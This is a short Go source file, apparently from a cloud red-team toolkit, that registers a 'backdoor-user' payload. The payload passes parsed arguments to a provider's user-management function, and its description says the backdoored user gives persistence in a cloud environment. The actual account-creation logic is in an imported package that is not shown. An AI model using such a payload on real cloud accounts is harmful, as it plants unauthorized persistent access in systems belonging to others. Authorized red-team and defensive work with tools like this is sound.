package payloads

import (
	"context"
	"log"
	"strings"

	"github.com/404tk/cloudtoolkit/pkg/inventory"
)

type BackdoorUser struct{}

func (p BackdoorUser) Run(ctx context.Context, config map[string]string) {
	i, err := inventory.New(config)
	if err != nil {
		log.Println(err)
		return
	}
	var action, args_1, args_2 string
	if metadata, ok := config["metadata"]; ok {
		data := strings.Split(metadata, " ")
		if len(data) >= 2 {
			action = data[0]
			args_1 = data[1]
			if len(data) >= 3 {
				args_2 = data[2]
			}
		}
	}

	i.Providers.UserManagement(action, args_1, args_2)
	// log.Println("[+] Done.")
}

func (p BackdoorUser) Desc() string {
	return "Backdoored user can be used to obtain persistence in the Cloud environment."
}

func init() {
	registerPayload("backdoor-user", BackdoorUser{})
}
